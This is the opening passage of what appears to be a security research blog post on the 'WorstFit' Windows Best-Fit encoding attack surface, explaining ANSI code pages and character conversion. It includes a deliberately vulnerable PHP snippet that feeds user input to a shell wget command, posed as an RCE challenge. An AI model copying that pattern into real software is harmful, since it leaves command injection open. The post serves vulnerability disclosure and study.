

<!DOCTYPE html>
<html class="no-js sub-menu">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta charset="utf-8" />
    <link href="/images/favicon.png" rel="icon" size="32x32">
    <!-- web fullscreen -->
    <meta name="apple-mobile-web-app-capable" content="yes"><!-- ios -->
    <meta name="mobile-web-app-capable" content="yes"><!-- android -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=0" />
    <meta name="format-detection" content="telephone=no">
    <title>WorstFit: Unveiling Hidden Transformers in Windows ANSI! | DEVCORE</title>
    <link rel="stylesheet" href="/css/style.css" />
    <script src="/js/modernizr-custom.js"></script>
    <script src="/js/jquery-3.6.0.min.js"></script>
    <script src="/js/site.js"></script>
    <meta name="description" property="og:description" content="The research unveils a new attack surface in Windows by exploiting Best-Fit, an internal charset conversion feature. Through our work, we successfully transformed this feature into several practical attacks, including Path Traversal, Argument Injection, and even RCE, affecting numerous well-known applications!" />
    <meta name="keywords" content="CVE, Vulnerability, WorstFit, RCE, Windows" />
    <meta property="og:site_name" content="DEVCORE 戴夫寇爾" />
    <meta property="og:title" content="WorstFit: Unveiling Hidden Transformers in Windows ANSI! | DEVCORE 戴夫寇爾" />
    <meta property="og:url" content="https://devco.re/blog/2025/01/09/worstfit-unveiling-hidden-transformers-in-windows-ansi/" />
    <meta property="og:type" content="website" />
    <meta property="og:image" content="https://devco.re/assets/img/blog/20250109/cover.jpeg" />
    <meta name="twitter:card" content="summary">
    <meta name="twitter:site" content="d3vc0r3">
    <meta name="twitter:title" content="WorstFit: Unveiling Hidden Transformers in Windows ANSI! | DEVCORE 戴夫寇爾">
    <meta name="twitter:description" content="The research unveils a new attack surface in Windows by exploiting Best-Fit, an internal charset conversion feature. Through our work, we successfully transformed this feature into several practical attacks, including Path Traversal, Argument Injection, and even RCE, affecting numerous well-known applications!">
    <meta name="twitter:creator" content="d3vc0r3">
    <meta name="twitter:image:src" content="https://devco.re/assets/img/blog/20250109/cover.jpeg">
    <meta name="twitter:domain" content="devco.re">
    <meta name="google-site-verification" content="lMNi_XT6UmeGqeYI_vLHu5PDRi_uNVfnA2NdDGS4-lM" />
    <meta name="msvalidate.01" content="119FDBB7730BE45B162515BBB1FF6B33" />
    <meta name="alexaVerifyID" content="j-Es9N9SD7ckfA2EokOz9SZzhok" />
    <meta name='yandex-verification' content='4561963cf1d18fe3' />
    <meta property="fb:admins" content="120968921404653" />

    <link rel="canonical" href="https://devco.re/blog/2025/01/09/worstfit-unveiling-hidden-transformers-in-windows-ansi/"/>
    <link rel="alternate" type="application/rss+xml" title="DEVCORE 戴夫寇爾" href="https://devco.re/rss">

    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-GHXJ9PS005"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());

      gtag('config', 'G-GHXJ9PS005');
    </script>
    <link rel="stylesheet" href="/fonts/inter.css" />
    <link rel="stylesheet" href="/css/highlighter.css" />
    <!-- <script src="https://cdn.jsdelivr.net/gh/google/code-prettify@master/loader/run_prettify.js"></script> -->
</head>
<body class="en">
    <!-- 導覽列 start -->
    <header class="header">
<div class="container">
    <!-- logo start -->
    <div class="logo">
        <a href="/en/">
            <img src="/images/logo.svg"/>
        </a>
    </div>
    <!-- logo end -->
    <!-- 主選單 start -->
    <nav class="nav">
        <ul class="menu">
            <li class="dropdown">
                <div class="menuLable">
                    <span>Services<i class="icon arrow_down"></i></span>

                    <div class="menuItem">
                        <a href="/en/services/red-team/">
                            <div class="item">

                                <h2>
                                    <i class="icon menu service-red-team"></i>
                                    Red Team Assessment
                                </h2>
                                <p class="two-line">
                                    Simulation of real-world attacks to identify vulnerabilities and achieve objectives without disrupting business operations.
                                </p>
                            </div>
                        </a>
                        <a href="/en/services/penetration-test/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu service-penetration-test"></i>
                                    Penetration Testing
                                </h2>
                                <p class="two-line">
                                    Infiltration of designated enterprise systems to uncover potential vulnerabilities and assess the risks or damages.
                                </p>
                            </div>
                        </a>
                        <a href="/en/services/security-consulting/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu service-security-consulting"></i>
                                    Security Consulting
                                </h2>
                                <p class="two-line">
                                    Consultation of resource distribution and long-term defensive strategies from the attacker’s perspective.
                                </p>
                            </div>
                        </a>
                        <a href="/en/services/security-training/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu service-security-training"></i>
                                    Security Training
                                </h2>
                                <p class="two-line">
                                    Instruction on defending and preventing incidents with the hacker mindset, also the response procedures and analysis of attacks when incidents happen.
                                </p>
                            </div>
                        </a>

                    </div>
                </div>
            </li>

            <li class="dropdown">
                <div class="menuLable">
                    <span>Research<i class="icon arrow_down"></i></span>

                    <div class="menuItem">
                        <a href="/en/research/overview/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu search-circle"></i>
                                    Overview
                                </h2>
                                <p class="two-line">
                                    Research of updated cybersecurity techniques and trends, assess the security of products, and evolve the red team with broad experience.
                                </p>
                            </div>
                        </a>
                        <a href="/en/research/awards/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu badge-check"></i>
                                    Competitions and Awards
                                </h2>
                                <p class="two-line">
                                    Awards from international cybersecurity competitions.
                                </p>
                            </div>
                        </a>
                        <a href="/en/research/bug-bounty/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu puzzle"></i>
                                    Enterprise Vulnerability Reports
                                </h2>
                                <p class="two-line">
                                    Research of the risk of enterprise systems, identification of potential weaknesses, and report to vendors.
                                </p>
                            </div>
                        </a>
                        <a href="/en/research/talks/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu globe"></i>
                                    International Conferences
                                </h2>
                                <p class="two-line">
                                    Sharing vulnerability research and security knowledge at international cybersecurity conferences.
                                </p>
                            </div>
                        </a>
                        <a href="/en/research/cve/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu view-list"></i>
                                    CVE List
                                </h2>
                                <p class="two-line">
                                    Discovery of critical vulnerabilities in leading international products and services.
                                </p>
                            </div>
                        </a>
                    </div>
                </div>


            </li>

            <li class="dropdown">
                <div class="menuLable" href="#">
                    <span>Company<i class="icon arrow_down"></i></span>

                    <div class="menuItem">
                        <a href="/en/company/about/">
                        <div class="item">
                            <h2>
                                <i class="icon menu company"></i>
                                Company Overview
                            </h2>
                            <p>
                                Founded by a world-class white hat hacker team, providing cybersecurity services including Red Team Assessment,  Penetration Testing, Security Consulting, and Security Training.
                            </p>
                        </div>
                        </a>
                        <a href="/en/company/our-team/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu team"></i>
                                    Team Members
                                </h2>
                                <p class="two-line">
                                    Composed of cybersecurity experts with the hacker mindset, exploring innovative exploitation techniques with high morality and extreme caution.
                                </p>
                            </div>
                        </a>
                        <a href="/en/company/history/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu milestone"></i>
                                    Achievements
                                </h2>
                                <p class="two-line">
                                    DEVCORE has been invited to leading cybersecurity conferences, has uncovered hundreds of critical product vulnerabilities, and helped enterprises improve their defensive capabilities.
                                </p>
                            </div>
                        </a>
                        <a href="/en/company/csr/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu heart"></i>
                                    Corporate Social Responsibility
                                </h2>
                                <p class="two-line">
                                    We provide diverse internship channels and programs to nurture the next generation and promote cybersecurity awareness.
                                </p>
                            </div>
                        </a>
                        <a href="/en/company/jobs/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu briefcase"></i>
                                    Job Opportunities
                                </h2>
                                <p class="two-line">
                                    Join us to secure the world and improve the cybersecurity industry together.
                                </p>
                            </div>
                        </a>
                        <a href="https://conf.devco.re/" target="_blank">
                            <div class="item">
                                <h2>
                                    <i class="icon menu conference"></i>
                                    DEVCORE CONFERENCE <i class="icon open-in-new"></i>
                                </h2>
                                <p class="two-line">
                                    DEVCORE’s annual technical conference focused on offensive security research, red team insights, and novel attack vectors from real-world operations.
                                </p>
                            </div>
                        </a>
                    </div>
                </div>
            </li>
            <li class="dropdown">
                <div class="menuLable">
                    <span>News<i class="icon arrow_down"></i></span>
                    <div class="menuItem">
                        <a href="/en/blog/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu newspaper"></i>
                                    BLOG
                                </h2>
                                <p>
                                    Latest news
                                </p>
                            </div>
                        </a>
                        <a href="/en/media-kit/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu download"></i>
                                    Media Resources
                                </h2>
                                <p>
                                    Media Kit, Logo and Usage Guideline
                                </p>
                            </div>
                        </a>
                    </div>
                </div>
            </li>
            <li>
                <a class="menuLable" href="/en/search/">Search</a>
            </li>
            <li>
                <a class="menuLable" href="/en/contact/">Contact</a>
            </li>
        </ul>
    </nav>
    <!-- 主選單 end -->
</div>


<!-- 手機板選單  start-->
<nav class="nav-m" id="menu-m">
    <ul class="menu">
        <li>
            <div class="menuLable">
                <span>Services</span>
                <div class="menuItem">
                    <a href="/en/services/red-team/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-red-team"></i>
                                Red Team Assessment
                            </h2>
                        </div>
                    </a>
                    <a href="/en/services/penetration-test/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-penetration-test"></i>
                                Penetration Testing
                            </h2>
                        </div>
                    </a>
                    <a href="/en/services/security-consulting/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-security-consulting"></i>
                                Security Consulting
                            </h2>
                        </div>
                    </a>
                    <a href="/en/services/security-training/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-security-training"></i>
                                Security Training
                            </h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <span>Research</span>
                <div class="menuItem">
                    <a href="/en/research/overview/" class="fullwidth">
                        <div class="item">
                            <h2>Overview</h2>
                        </div>
                    </a>
                    <a href="/en/research/awards/">
                        <div class="item">
                            <h2>Competitions and Awards</h2>
                        </div>
                    </a>
                    <a href="/en/research/bug-bounty/">
                        <div class="item">
                            <h2>Enterprise Vulnerability Reports</h2>
                        </div>
                    </a>
                    <a href="/en/research/talks/">
                        <div class="item">
                            <h2>International Conferences</h2>
                        </div>
                    </a>
                    <a href="/en/research/cve/">
                        <div class="item">
                            <h2>CVE List</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>

        <li>
            <div class="menuLable">
                <span>Company</span>
                <div class="menuItem">
                    <a href="/en/company/about/" class="fullwidth">
                        <div class="item">
                            <h2>Company Overview</h2>
                        </div>
                    </a>
                    <a href="/en/company/our-team/">
                        <div class="item">
                            <h2>Team Members</h2>
                        </div>
                    </a>
                    <a href="/en/company/history/">
                        <div class="item">
                            <h2>Achievements</h2>
                        </div>
                    </a>
                    <a href="/en/company/csr/">
                        <div class="item">
                            <h2>Corporate Social Responsibility</h2>
                        </div>
                    </a>
                    <a href="/en/company/jobs/">
                        <div class="item">
                            <h2>Job Opportunities</h2>
                        </div>
                    </a>
                    <a href="https://conf.devco.re/" target="_blank">
                        <div class="item">
                            <h2>DEVCORE CONFERENCE</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <span>News</span>
                <div class="menuItem">
                    <a href="/en/blog/">
                        <div class="item">
                            <h2>BLOG</h2>
                        </div>
                    </a>
                    <a href="/en/media-kit/">
                        <div class="item">
                            <h2>Media Resources</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <div class="menuItem">
                    <a href="/en/search/" class="fullwidth">
                        <div class="item">
                            <h2 class="center">
                                <i class="icon search"></i>
                                Search
                            </h2>
                        </div>
                    </a>
                    <a href="/en/contact/" class="fullwidth">
                        <div class="item">
                            <h2 class="center">
                                <i class="icon chat-alt"></i>
                                Contact
                            </h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <span><i class="icon translate"></i>Language</span>
                <div class="menuItem">
                    <a href="/">
                    <div class="item">
                        <h2>中文</h2>
                    </div>
                    </a>
                    <a href="/en">
                        <div class="item">
                            <h2>English</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
    </ul>
</nav>
<!-- 手機板選單  end-->
    </header>
    <!-- 導覽列 end -->

    <!-- tab 選單 start -->
    <div class="sub-nav">
        <div class="container">
            <h1>BLOG</h1>
            <ul class="tab">
                <li>
                    <a href="/en/blog/">All Articles</a>
                </li>
                <li>
                    <a href="/en/blog/category/Tech%20Editorials/">Tech Editorials</a>
                </li>
                <li>
                    <a href="/en/media-kit/">Media Resources</a>
                </li>
            </ul>
        </div>
    </div>
    <!-- tab 選單 end -->
    
    <div class="main">
        <!-- 文章外層layer -->
        <section class="narrow">
            <!-- 文章 start -->
            <article class="article_body">
                <div class="content">
                    <a class="category" href="/en/blog/category/Tech Editorials">Tech Editorials</a>
                    <span class="tag">

                      <a href="/en/blog/tag/CVE/">#CVE</a> <a href="/en/blog/tag/Vulnerability/">#Vulnerability</a> <a href="/en/blog/tag/WorstFit/">#WorstFit</a> <a href="/en/blog/tag/RCE/">#RCE</a> <a href="/en/blog/tag/Windows/">#Windows</a> 
                    </span>
                    <h1>
                        WorstFit: Unveiling Hidden Transformers in Windows ANSI!
                    </h1>
                    
                    
                    <div class="author_detail">
                        <span class="avatar">
                            <a href="/en/blog/author/orange">
                                <div class="circle">
                                    <i class="user" style="background-image: url('/assets/img/avatar/orig/orange.png');" ></i>
                                </div>
                            </a>
                        </span>
                        <span class="author"><a href="/en/blog/author/orange">Orange Tsai</a></span>
                        <span class="date">2025-01-09</span>
                    </div>
                    
                    
                    <div class="article_img">
                        <img src="https://devco.re/assets/img/blog/20250109/cover.jpeg"/>
                    </div>
                    

                    <hr>

                    <!-- 文章內容 -->
                    <div class="article_content">
<style>
    .language-plaintext {
        background-color: rgba(0, 0, 0, 0.04);
        padding: 0.2em;
        font-size: 85%;
    }

    .highlight {
        border-left: 2px solid #44D62C !important;
    }
</style>

<p><em>Author: <a href="https://x.com/orange_8361">Orange</a> &amp; <a href="https://x.com/_splitline_">Splitline</a></em></p>

<p>The research unveils a new attack surface in Windows by exploiting <strong>Best-Fit</strong>, an internal charset conversion feature. Through our work, we successfully transformed this feature into several practical attacks, including Path Traversal, Argument Injection, and even RCE, affecting numerous well-known applications!</p>

<p>Given that the root cause spans compiler behavior, C/C++ runtime and developer’s mistakes, we also discussed the challenges of pushing fixes within the open-source ecosystem.</p>

<p>Get the latest update and slides on our website!🔥 → <a href="https://worst.fit/">https://worst.fit/</a></p>

<hr />

<p>Let’s imagine that: you’re a pentester, and your target website is running the following code. Can you pop a <code class="language-plaintext highlighter-rouge">calc.exe</code> with that? <!-- You can have a quick try on your own. --></p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
  <span class="nv">$url</span> <span class="o">=</span> <span class="s2">"https://example.tld/"</span> <span class="mf">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">".txt"</span><span class="p">;</span>
  <span class="nb">system</span><span class="p">(</span><span class="s2">"wget.exe -q "</span> <span class="mf">.</span> <span class="nb">escapeshellarg</span><span class="p">(</span><span class="nv">$url</span><span class="p">));</span>
</code></pre></div></div>

<p>You can have a quick try on your own. The PHP code uses a secure way to spawn the command. Looks a bit hard, right?</p>

<p>Well, today, we would like to present a new technique to break through it!</p>

<p><br /></p>

<h2 id="outline">Outline</h2>

<blockquote>
  <ul>
    <li><a href="#outline">Outline</a></li>
    <li><a href="#decoding-the-windows-encodings">Decoding the Windows Encodings</a>
      <ul>
        <li><a href="#the-early-days-ansi-and-code-pages">The Early Days: ANSI and Code Pages</a></li>
        <li><a href="#the-unicode-era-utf-16">The Unicode Era: UTF-16</a></li>
        <li><a href="#the-dual-era-of-encoding">The Dual Era of Encoding</a></li>
      </ul>
    </li>
    <li><a href="#it-was-the-best-of-fit">It was the Best of Fit</a></li>
    <li><a href="#it-was-the-worst-of-fit--the-novel-attack-surface-on-windows">It was the Worst of Fit – The novel attack surface on Windows</a>
      <ul>
        <li><a href="#-the-nightmare-of-east-asia---cve-2024-4577">🔥 The nightmare of East-Asia - CVE-2024-4577</a></li>
        <li><a href="#-filename-smuggling">🔥 Filename Smuggling</a></li>
        <li><a href="#-argument-splitting">🔥 Argument Splitting</a></li>
        <li><a href="#-environment-variable-confusion">🔥 Environment Variable Confusion</a></li>
      </ul>
    </li>
    <li><a href="#the-duskor-dawnof-the-worstfit">The Dusk–or Dawn–of the WorstFit</a></li>
    <li><a href="#epilogue">Epilogue</a>
      <ul>
        <li><a href="#mitigations">Mitigations</a></li>
        <li><a href="#conclusion">Conclusion</a></li>
      </ul>
    </li>
  </ul>
</blockquote>

<p><br /></p>

<h2 id="decoding-the-windows-encodings">Decoding the Windows Encodings</h2>

<p>If you are a Windows user, you’re probably aware that the Windows operating system supports Unicode. This means we can seamlessly put emojis ✅, áccènted letters, 𝒻𝒶𝓃𝒸𝓎 𝕤𝕪𝕞𝕓𝕠𝕝𝕤 and CJK <abbr title="CHARACTERS">匚卄八尺八匚ㄒヨ尺丂</abbr> pretty much anywhere — like file names, file contents, or even environment variables. But have you ever wondered how Windows manages to handle those non-ASCII characters?</p>

<p>Well, to describe this, let’s dive into the history of encoding in Windows first to understand how it handles.</p>

<p><img src="/assets/img/blog/20250109/1.png" alt="" /></p>

<h3 id="the-early-days-ansi-and-code-pages">The Early Days: ANSI and Code Pages</h3>

<p>Windows initially used ANSI encoding, which relied on code pages such as the one shown below. It used 8 to 16 bits to represent a single character. While these mappings were effective for certain languages, they were unable to accommodate mixed or universal character sets.</p>

<table>
  <thead>
    <tr>
      <th><strong>Code Page</strong></th>
      <th><strong>Language</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>1250</td>
      <td>Central / Eastern European languages (e.g., Polish, Czech)</td>
    </tr>
    <tr>
      <td>1251</td>
      <td>Cyrillic-based languages (e.g., Russian, Bulgarian)</td>
    </tr>
    <tr>
      <td>1252</td>
      <td>Western European languages (e.g., English, German, French)</td>
    </tr>
    <tr>
      <td>1253</td>
      <td>Greek</td>
    </tr>
    <tr>
      <td>1254</td>
      <td>Turkish</td>
    </tr>
    <tr>
      <td>1255</td>
      <td>Hebrew</td>
    </tr>
    <tr>
      <td>1256</td>
      <td>Arabic</td>
    </tr>
    <tr>
      <td>1257</td>
      <td>Baltic languages (e.g., Estonian, Latvian, Lithuanian)</td>
    </tr>
    <tr>
      <td>1258</td>
      <td>Vietnamese</td>
    </tr>
    <tr>
      <td>932</td>
      <td>Japanese</td>
    </tr>
    <tr>
      <td>936</td>
      <td>Simplified Chinese</td>
    </tr>
    <tr>
      <td>949</td>
      <td>Korean</td>
    </tr>
    <tr>
      <td>950</td>
      <td>Traditional Chinese</td>
    </tr>
    <tr>
      <td>874</td>
      <td>Thai</td>
    </tr>
  </tbody>
</table>

<p>For instance, back in the day, as a Taiwanese, if my Japanese friend sent me an article written on their Windows computer, I’d probably end up with a scrambled mess of <a href="https://en.wikipedia.org/wiki/Mojibake">mojibake</a> because my code page 950 system couldn’t properly interpret the Japanese 932 code page.</p>

<p>To handle different encoding needs, Windows doesn’t rely on just one type of code page — there are actually two:</p>

<ul>
  <li><strong>ACP</strong> (ANSI Code Page): Used for most applications and system settings, such as file operations or managing environment variables. Our research here primarily focuses on this type of code page, as it significantly impacts the scenarios we’ll examine.</li>
  <li><strong>OEMCP</strong> (Original Equipment Manufacturer Code Page): Mainly used for device communication, such as reading or writing to the console.</li>
</ul>

<p>To check which ACP (ANSI code page) you’re using, consider these methods:</p>
<ol>
  <li><strong>Using PowerShell</strong>
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w"> </span><span class="n">powershell.exe</span><span class="w"> </span><span class="p">[</span><span class="n">Console</span><span class="p">]::</span><span class="nx">OutputEncoding.WindowsCodePage</span><span class="w">
</span></code></pre></div>    </div>
  </li>
  <li><strong>From the Registry</strong>
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w"> </span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\CodePage</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="nx">ACP</span><span class="w">
</span></code></pre></div>    </div>
  </li>
</ol>

<p>Additionally, you might also heard of <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/chcp"><code class="language-plaintext highlighter-rouge">chcp</code></a>. However, be aware that <code class="language-plaintext highlighter-rouge">chcp</code> displays the <strong>OEMCP</strong>  rather than the ACP, which is the focus of our research here.</p>

<h3 id="the-unicode-era-utf-16">The Unicode Era: UTF-16</h3>
<p>To address the limitations of code pages, Windows transitioned to Unicode in the mid-1990s. Unlike code pages, Unicode could represent characters from nearly all languages in a single standard.</p>

<p>Initially, Windows used UCS-2 for Unicode but soon upgraded to <strong>UTF-16</strong>, which uses 16 bits for most characters and expands to 32 bits for rarer ones (e.g., emojis, ancient scripts). Windows also switched to <strong>wide characters</strong> for core APIs like file systems, system information, and text processing.</p>

<p>Now you might be wondering: Hey, what about the most popular Unicode encoding nowadays: <strong>UTF-8</strong>? Well, it’s already there, but still in a sort of beta phase. For most languages, the UTF-8 feature sadly isn’t enabled by default.</p>

<p><img src="/assets/img/blog/20250109/2.png" alt="" /></p>

<h3 id="the-dual-era-of-encoding">The Dual Era of Encoding</h3>

<p>Even though Unicode became the backbone of Windows, Windows still needs to do what they always do: backward compatible. They still need to support the old ANSI code pages. To achieve this, Windows implemented two different versions of APIs:</p>

<ul>
  <li><strong>ANSI APIs</strong>: A Windows code page version with the letter “A” postfix used to indicate “ANSI”. For example, <a href="https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getenvironmentvariablea"><code class="language-plaintext highlighter-rouge">GetEnvironmentVariableA</code></a> function.</li>
  <li><strong>Unicode APIs</strong>: A Unicode version with the letter “W” postfix used to indicate “wide (character)”. For example, <a href="https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getenvironmentvariablew"><code class="language-plaintext highlighter-rouge">GetEnvironmentVariableW</code></a> function.</li>
</ul>

<p>This approach allows developers to easily obtain their desired data format by simply switching between the A-postfix and W-postfix APIs.</p>

<p>It sounds perfect – But wait, so how can a wide character UTF-16 string also be in the ANSI format? Aren’t they fundamentally different?</p>

<p>To illustrate this, let’s explore an example. Imagine we’re on an English (<strong>Windows-1252</strong> code page) system with an environment variable <code class="language-plaintext highlighter-rouge">ENV=Hello</code> stored in the system. The data is internally stored as <strong>UTF-16</strong> (wide character format), but we can retrieve it using both Unicode and ANSI APIs:</p>

<ul>
  <li><strong>Unicode API</strong>: <code class="language-plaintext highlighter-rouge">GetEnvironmentVariableW(L"ENV")</code> ⭢ <code class="language-plaintext highlighter-rouge">L"Hello"</code> (Hex: <code class="language-plaintext highlighter-rouge">4800 6500 6C00 6C00 6F00</code> in UTF-16LE).</li>
  <li><strong>ANSI API</strong>: <code class="language-plaintext highlighter-rouge">GetEnvironmentVariableA("ENV")</code> — <code class="language-plaintext highlighter-rouge">RtlUnicodeStringToAnsiString</code> ⭢ <code class="language-plaintext highlighter-rouge">"Hello"</code> (Hex: <code class="language-plaintext highlighter-rouge">48 65 6C 6C 6F</code> in ANSI).</li>
</ul>

<p>For the <strong>Unicode API</strong>, there’s no problem—Unicode in, Unicode out, with no conversion needed. For the <strong>ANSI API</strong>, Windows applies an implicit conversion by calling <a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-rtlunicodestringtoansistring"><code class="language-plaintext highlighter-rouge">RtlUnicodeStringToAnsiString</code></a> (or sometimes <a href="https://learn.microsoft.com/en-us/windows/win32/api/stringapiset/nf-stringapiset-widechartomultibyte"><code class="language-plaintext highlighter-rouge">WideCharToMultiByte</code></a>) to convert the original Unicode string to an ANSI string. Since <code class="language-plaintext highlighter-rouge">"Hello"</code> consists only of ASCII characters, everything works perfectly and as expected.</p>

<p>But what happens if the environment variable contains a more complex string, like <strong><code class="language-plaintext highlighter-rouge">√π⁷≤∞</code></strong>, with a lot of non-ASCII characters?</p>

<ul>
  <li><strong>Unicode API</strong>: <code class="language-plaintext highlighter-rouge">GetEnvironmentVariableW(L"ENV")</code> ⭢ <code class="language-plaintext highlighter-rouge">L"√π⁷≤∞"</code> (Hex: <code class="language-plaintext highlighter-rouge">1a22 c003 7720 6422 1e22</code> in UTF-16LE).</li>
</ul>

<p>The <strong>Unicode API</strong> correctly returns the original string as we expected.</p>

<p>Now, what happens with the ANSI API? Are you able to guess the result?</p>

<ul>
  <li><strong>ANSI API</strong>: <code class="language-plaintext highlighter-rouge">GetEnvironmentVariableA("ENV")</code> — <code class="language-plaintext highlighter-rouge">RtlUnicodeStringToAnsiString</code> ⭢ <code class="language-plaintext highlighter-rouge">"vp7=8"</code> (Hex: <code class="language-plaintext highlighter-rouge">76 70 37 3D 38</code> in ANSI) 🤯</li>
</ul>

<p>Yep, the output is <strong><code class="language-plaintext highlighter-rouge">vp7=8</code></strong>. A strange result, right? I guess you can’t even figure out the connection between the original characters and their character codes!</p>

<p>This bizarre transformation is what’s known as <strong>“Best-Fit”</strong> behavior. As a result, the original string <code class="language-plaintext highlighter-rouge">√π⁷≤∞</code> transforms into a nonsensical <code class="language-plaintext highlighter-rouge">"vp7=8"</code>. This behavior highlights the pitfalls of relying on ANSI APIs when handling non-ASCII characters.</p>

<p>And actually, it’s not just when using Windows APIs directly — this behaviour also occurs when using non-wide-character version CRT (C runtime) functions like <a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getenv-wgetenv"><code class="language-plaintext highlighter-rouge">getenv</code></a>. Surprisingly, even when you receive arguments or environment variables through a seemingly straightforward non-wide-character <code class="language-plaintext highlighter-rouge">main</code> function like:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span><span class="o">*</span> <span class="n">envp</span><span class="p">[])</span> <span class="p">{</span>
    <span class="n">print</span><span class="p">(</span><span class="s">"test_env = %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"test_env"</span><span class="p">));</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">argc</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"argv[%d] = %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The same Best-Fit behavior applies to both the arguments and the environment variables. Here’s what happens when we run this code:</p>

<p><img src="/assets/img/blog/20250109/3.png" alt="" /></p>

<p>This happens because, during compilation, the compiler inserts several functions and links the CRT DLLs for you, which internally rely on ANSI Windows APIs. As a result, the same Best-Fit behavior is triggered implicitly.</p>

<p>We keep talking about Best-Fit, but how does this quirky behavior actually work in the end?</p>

<p><br /></p>

<h2 id="it-was-the-best-of-fit">It was the Best of Fit</h2>

<p>In Windows, “Best-Fit” character conversion is a way the operating system handles situations where it needs to convert characters from UTF-16 to ANSI, but the exact character doesn’t exist in the target code page.</p>

<p>For instance, the <code class="language-plaintext highlighter-rouge">∞</code> (<a href="https://www.compart.com/en/unicode/U+221E">U+221E</a>) symbol isn’t part of the <a href="https://en.wikipedia.org/wiki/Windows-1252#Codepage_layout">Windows-1252 code page</a>, so Microsoft decided to map it to the “<strong>closest</strong>” character—<code class="language-plaintext highlighter-rouge">8</code> (<a href="https://worst.fit/mapping/#CP%3A1252%20FROM%3A0x221e">🔍</a>). Uh, okay. Yeah I guess they kinda look similar, but I thought they should be still completely different things…</p>

<p>Anyway, obviously there’s no strict formula for Best-Fit mapping – what Microsoft does is more about making characters look, or even “feel” somewhat alike.</p>

<p>Also, different language configurations (code pages) handle mappings differently. For instance, the yen sign (<code class="language-plaintext highlighter-rouge">U+00A5</code>) is mapped to a backslash (<code class="language-plaintext highlighter-rouge">\</code>) on the Japanese (932) code page, to a “Y” on the Central European (1250) code page, and remains unchanged on most other code pages. This variability will play a significant role in how exploits behave across different system settings.</p>

<p>If you’re curious about the specifics, you can check out our <a href="https://worst.fit/mapping/">Best-fit Mapping Grepper</a> tool or dive into the raw mapping data on <a href="https://www.unicode.org/Public/MAPPINGS/VENDORS/MICSFT/WindowsBestFit/readme.txt">Unicode.org</a> by yourself.</p>

<p>Interestingly, during our research we found that this <strong>Best-Fit</strong> behavior was already mentioned back in Black Hat USA 2009 during Chris Weber’s presentation, <a href="https://www.blackhat.com/presentations/bh-usa-09/WEBER/BHUSA09-Weber-UnicodeSecurityPreview-SLIDES.pdf">“Unicode Security”</a>. However, he only briefly touched on how this feature could be exploited to bypass simple blacklist.</p>

